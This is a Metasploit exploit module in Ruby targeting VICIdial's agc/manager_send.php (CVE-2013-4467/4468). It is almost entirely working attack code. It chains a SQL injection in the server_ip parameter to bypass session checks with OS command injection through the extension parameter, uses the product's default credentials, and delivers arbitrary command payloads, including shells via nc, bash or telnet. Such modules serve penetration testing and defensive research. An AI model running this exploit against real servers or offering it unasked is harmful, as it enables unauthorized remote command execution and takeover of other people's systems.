##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
 
require 'msf/core'
 
class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking
 
  include Msf::Exploit::Remote::HttpClient
 
  def initialize(info = {})
    super(update_info(info,
      'Name'        => 'VICIdial Manager Send OS Command Injection',
      'Description' => %q{
          The file agc/manager_send.php in the VICIdial web application uses
        unsanitized user input as part of a command that is executed using the PHP
        passthru() function. A valid username, password and session are needed to access
        the injection point. Fortunately, VICIdial has two built-in accounts with default
        passwords and the manager_send.php file has a SQL injection vulnerability that can
        be used to bypass the session check as long as at least one session has been
        created at some point in time. In case there isn't any valid session, the user can
        provide astGUIcient credentials in order to create one. The results of the injected
        command are returned as part of the response from the web server. Affected versions
        include 2.7RC1, 2.7, and 2.8-403a. Other versions are likely affected as well. The
        default credentials used by Vicidial are VDCL/donotedit and VDAD/donotedit.
      },
      'Author'      =>
        [
          'Adam Caudill <adam@adamcaudill.com>', # Vulnerability discovery
          'AverageSecurityGuy <stephen@averagesecurityguy.info>', # Metasploit Module
          'sinn3r', # Metasploit module
          'juan vazquez' # Metasploit module
        ],
      'License'     => MSF_LICENSE,
      'References'  =>
        [
          [ 'CVE', '2013-4467' ],
          [ 'CVE', '2013-4468' ],
          [ 'OSVDB', '98903' ],
          [ 'OSVDB', '98902' ],
          [ 'BID', '63340' ],
          [ 'BID', '63288' ],
          [ 'URL', 'http://www.openwall.com/lists/oss-security/2013/10/23/10' ],
          [ 'URL', 'http://adamcaudill.com/2013/10/23/vicidial-multiple-vulnerabilities/' ]
        ],
      'DisclosureDate' => 'Oct 23 2013',
      'Privileged'     => true,
      'Platform'       => ['unix'],
      'Payload'        =>
        {
          'DisableNops' => true,
          'Space'       => 8000, # Apache's limit for GET, it should be enough one to fit any payload
          'Compat'      =>
            {
              'PayloadType' => 'cmd',
              # Based on vicibox availability of binaries
              'RequiredCmd' => 'generic perl python awk bash telnet nc openssl',
            }
        },
      'Targets'        =>
        [
          [ 'CMD',
            {
              'Arch' => ARCH_CMD,
              'Platform' => 'unix'
            }
          ]
        ],
      'DefaultTarget'  => 0
      ))
 
    register_options(
      [
        OptString.new('USERNAME',              [true, 'VICIdial Username', 'VDCL']),
        OptString.new('PASSWORD',              [true, 'VICIdial Password', 'donotedit']),
        OptString.new('USER_ASTGUI',           [false, 'astGUIcient User Login', '6666']),
        OptString.new('PASS_ASTGUI',           [false, 'astGUIcient User Password', '1234']),
        OptString.new('PHONE_USER_ASTGUI',     [false, 'astGUIcient Phone Login', '6666']),
        OptString.new('PHONE_PASSWORD_ASTGUI', [false, 'astGUIcient Phone Password', '1234'])
      ], self.class)
  end
 
  # Login through astGUIclient and create a web_client_sessions if there isn't
  # something available
  def login
    begin
      res = send_request_cgi({
        'uri'       => '/agc/astguiclient.php',
        'method'    => 'POST',
        'vars_post' => {
         "user"        => datastore["USER_ASTGUI"],
         "pass"        => datastore["PASS_ASTGUI"],
         "phone_login" => datastore["PHONE_USER_ASTGUI"],
         "phone_pass"  => datastore["PHONE_PASSWORD_ASTGUI"]
        }
      })
    rescue ::Rex::ConnectionError
      vprint_error("#{rhost}:#{rport} - Failed to connect to the web server")
      return nil
    end
 
    return res
  end
 
  def astguiclient_creds?
    if datastore["USER_ASTGUI"].nil? or datastore["USER_ASTGUI"].empty?
      return false
    end
 
    if datastore["PASS_ASTGUI"].nil? or datastore["PASS_ASTGUI"].empty?
      return false
    end
 
    if datastore["PHONE_USER_ASTGUI"].nil? or datastore["PHONE_USER_ASTGUI"].empty?
      return false
    end
 
    if datastore["PHONE_PASSWORD_ASTGUI"].nil? or datastore["PHONE_PASSWORD_ASTGUI"].empty?
      return false
    end
 
    return true
  end
 
  def request(cmd, timeout = 20)
    begin
      res = send_request_cgi({
        'uri'      => '/agc/manager_send.php',
        'method'   => 'GET',
        'vars_get' => {
          "enable_sipsak_messages" => "1",
          "allow_sipsak_messages"  => "1",
          "protocol"               => "sip",
          "ACTION"                 => "OriginateVDRelogin",
          "session_name"           => rand_text_alpha(12), # Random session name
          "server_ip"              => "' OR '1' = '1", # SQL Injection to validate the session
          "extension"              => ";#{cmd};",
          "user"                   => datastore['USERNAME'],
          "pass"                   => datastore['PASSWORD']
        }
      }, timeout)
    rescue ::Rex::ConnectionError
      vprint_error("#{rhost}:#{rport} - Failed to connect to the web server")
      return nil
    end
 
    return res
  end
 
  def check
    res = request('ls -a .')
 
    if res and res.code == 200
      if res.body =~ /Invalid Username\/Password/
        vprint_error("#{peer} - Invalid Username or Password.")
        return Exploit::CheckCode::Detected
      elsif res.body =~ /Invalid session_name/
        vprint_error("#{peer} - Web client session not found")
        return Exploit::CheckCode::Detected
      elsif res.body =~ /\.\n\.\.\n/m
        return Exploit::CheckCode::Vulnerable
      end
    end
 
    return Exploit::CheckCode::Unknown
  end
 
  def exploit
    print_status("#{peer} - Checking if injection is possible...")
    res = request('ls -a .')
 
    unless res and res.code == 200
      fail_with(Failure::Unknown - "#{peer} - Unknown response, check the target")
    end
 
    if res.body =~ /Invalid Username\/Password/
      fail_with(Failure::NoAccess - "#{peer} - Invalid VICIdial credentials, check USERNAME and PASSWORD")
    end
 
    if res.body =~ /Invalid session_name/
      fail_with(Failure::NoAccess, "#{peer} - Valid web client session not found, provide astGUI or wait until someone logins") unless astguiclient_creds?
      print_error("#{peer} - Valid web client session not found, trying to create one...")
      res = login
      unless res and res.code == 200 and res.body =~ /you are logged/
        fail_with(Failure::NoAccess, "#{peer} - Invalid astGUIcient credentials, check astGUI credentials or wait until someone login.")
      end
      res = request('ls -a .')
    end
 
    unless res and res.code == 200 and res.body =~ /\.\n\.\.\n/m
      fail_with(Failure::NotVulnerable, "#{peer} - Injection hasn't been possible")
    end
 
    print_good("#{peer} - Exploitation looks feasible, proceeding... ")
    request("#{payload.encoded}", 1)
  end
 
end
